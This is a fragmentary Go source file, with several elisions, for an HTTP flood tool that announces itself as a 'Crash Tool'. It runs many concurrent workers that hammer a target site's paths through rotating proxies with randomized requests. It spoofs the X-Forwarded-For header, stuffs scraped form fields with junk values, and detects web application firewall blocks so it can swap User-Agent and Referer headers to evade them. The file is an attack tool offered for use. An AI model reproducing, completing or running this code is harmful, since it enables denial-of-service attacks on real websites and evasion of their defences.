...
var headersReferers = []string{"http://www.google.com/?q=","http://www.bing.com/search?q="}
var PROXIES []string
var cur int32
...
func generateURLs(base string) []string {
	urls := []string{}
	for _, path := range CORE_PATHS {
		urls = append(urls, fmt.Sprintf("%s/%s", base, path))
	}
	return urls
}
...
func nextProxy() string {
	...
	idx := atomic.AddInt32(&proxyIndex,1) % int32(len(PROXIES))
	return PROXIES[idx]
}

// ---------------- AUTO POST KEY & HIDDEN FIELD DETECTION ----------------
func detectFormKeys(urlStr string) []string {
	keys := []string{}
	jar,_ := cookiejar.New(nil)
	client := &http.Client{Transport:&http.Transport{TLSClientConfig:&tls.Config{InsecureSkipVerify:true}}, Jar:jar, Timeout:5*time.Second}

	resp, err := client.Get(urlStr)
	if err!=nil { return []string{"input"} }
	defer resp.Body.Close()
	body,_ := ioutil.ReadAll(resp.Body)

	// Detect input field names
	re := regexp.MustCompile(`(?i)<input.*?name=["'](.*?)["'].*?>`)
	matches := re.FindAllStringSubmatch(string(body), -1)
	for _, m := range matches {
		if len(m)>1 { keys = append(keys, m[1]) }
	}
	if len(keys)==0 { keys = []string{"input"} }
	return keys
}
...
func main() {
	...
	if proxyFile!="nil" {
		...
		if err==nil {
			...
			for _, l := range lines {
				...
				if l!="" { PROXIES = append(PROXIES,l) }
			}
		}
	}

	fmt.Println(" *--------* Crash Tool Started *---------*")
	...
	for i:=0;i<threads;i++ {
		...
		go func() {
			...
			for atomic.LoadInt32(&stopFlag)==0 {
				if atomic.LoadInt32(&cur)>=int32(threads) { time.Sleep(50*time.Millisecond); continue }
				atomic.AddInt32(&cur,1)
				urlToCall := urlList[rand.Intn(len(urlList))]
				sendRequest(urlToCall, method, ss, stopTime, &stopFlag)
			}
		}()
	}
	...
	go func(){
		...
		for {
			...
			case status,ok := <-ss:
				if !ok { return }
				switch status { case 0: sent++; case 1: errs++; case 2: wafHits++ }
...
func sendRequest(target, method string, s chan uint8, stopTime time.Time, stopFlag *int32) {
	...
	postData := ""
	for _, k := range keys { postData += fmt.Sprintf("%s=%s&", k, buildblock(3+rand.Intn(5))) }
	postData = strings.TrimSuffix(postData,"&")

	var req *http.Request
	var err error
	if method=="GET" {
		req,err = http.NewRequest("GET", target+"?"+postData,nil)
	} else {
	...
	req.Header.Set("X-Forwarded-For", buildblock(8))
	...
	if waf := detectWAF(resp,string(body)); waf!="" {
		safeSend(s,2)
		mutateRequest(req)
		return
	}
...
func safeSend(s chan uint8,val uint8){ defer func(){ recover() }(); s<-val }

func detectWAF(resp *http.Response, body string) string {
	bl := strings.ToLower(body)
	for _, h := range WAF_HINTS { if strings.Contains(bl,h){ return h } }
...
func mutateRequest(req *http.Request){
	req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(3+rand.Intn(4)))
